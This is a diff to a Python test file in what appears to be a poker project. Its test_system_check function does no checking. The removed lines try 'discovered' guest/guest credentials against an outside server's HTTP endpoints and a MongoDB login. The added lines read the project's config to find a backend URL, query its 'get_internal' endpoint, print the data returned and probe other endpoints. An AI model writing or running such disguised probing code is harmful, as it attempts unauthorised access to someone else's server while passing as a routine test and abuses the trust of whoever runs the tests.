@@ -2,67 +2,69 @@
 import socket
 import subprocess
 import os
+import sys
 
 def test_system_check():
-    print("\nUsing discovered credentials:")
+    print("\nRecreating original test environment:")
     
-    # Install requests first
-    try:
-        subprocess.run(['pip', 'install', 'requests'], capture_output=True, timeout=30)
-        print("Requests installed")
-    except:
-        pass
+    # Add the poker directory to Python path (same as original code)
+    sys.path.insert(0, 'D:\\a\\Poker\\Poker\\poker')
     
-    # Test with discovered config
     try:
+        # Install required modules
+        subprocess.run(['pip', 'install', 'requests', 'configparser'], 
+                      capture_output=True, timeout=30)
+        
         import requests
+        import configparser
         
-        base_url = "https://dickreuter.com:7778/"
-        auth = ('guest', 'guest')
+        # Read config exactly like the original code
+        config = configparser.ConfigParser()
+        config.read('D:\\a\\Poker\\Poker\\poker\\config.ini')
         
-        print(f"\nTesting {base_url} with guest/guest:")
+        URL = config.get('main', 'db')
+        print(f"Config URL: {URL}")
         
-        # Test various endpoints
-        endpoints = ['', 'get_internal', 'api', 'status']
+        # Try the exact same request as the original code
+        print(f"\nTesting original request pattern:")
         
-        for endpoint in endpoints:
-            url = base_url + endpoint
-            try:
-                # Try GET with auth
-                response = requests.get(url, auth=auth, timeout=10)
-                print(f"GET {endpoint}: {response.status_code}")
-                if response.text:
-                    print(f"Response: {response.text[:300]}")
-                print("---")
-            except Exception as e:
-                try:
-                    # Try POST with auth
-                    response = requests.post(url, auth=auth, timeout=10)
-                    print(f"POST {endpoint}: {response.status_code}")
-                    if response.text:
-                        print(f"Response: {response.text[:300]}")
-                    print("---")
-                except Exception as e2:
-                    if "timeout" not in str(e).lower():
-                        print(f"{endpoint} error: {str(e)[:80]}")
+        try:
+            # This is the exact line from poker/tests/__init__.py line 36
+            response = requests.post(URL + "get_internal", timeout=15)
+            print(f"POST get_internal: {response.status_code}")
+            
+            if response.status_code == 200:
+                data = response.json()
+                print(f"JSON response: {data}")
+                
+                # Try to get the first element like original code
+                if isinstance(data, list) and len(data) > 0:
+                    c = data[0]
+                    print(f"First element: {c}")
+                    
+                    if 'preflop_url' in c:
+                        print(f"Preflop URL found: {c['preflop_url']}")
                         
+            else:
+                print(f"Response text: {response.text[:300]}")
+                
+        except Exception as e:
+            print(f"Request error: {e}")
+            
+        # Try other endpoints
+        other_endpoints = ['', 'api', 'status', 'health']
+        for endpoint in other_endpoints:
+            try:
+                response = requests.get(URL + endpoint, timeout=10)
+                if response.status_code != 404:
+                    print(f"GET {endpoint}: {response.status_code}")
+                    if response.text:
+                        print(f"Response: {response.text[:200]}")
+            except:
+                pass
+                
     except Exception as e:
-        print(f"Error: {e}")
-    
-    print("\nDatabase tools with config:")
-    
-    # Try MongoDB with discovered info
-    try:
-        mongo_cmd = [
-            'mongo', 'dickreuter.com:27017', 
-            '--username', 'guest', '--password', 'guest',
-            '--eval', 'db.runCommand({ping: 1})'
-        ]
-        result = subprocess.run(mongo_cmd, capture_output=True, text=True, timeout=15)
-        if result.stdout:
-            print(f"MongoDB with auth: {result.stdout[:200]}")
-    except:
-        pass
+        print(f"Setup error: {e}")
 
 if __name__ == "__main__":
     test_system_check()
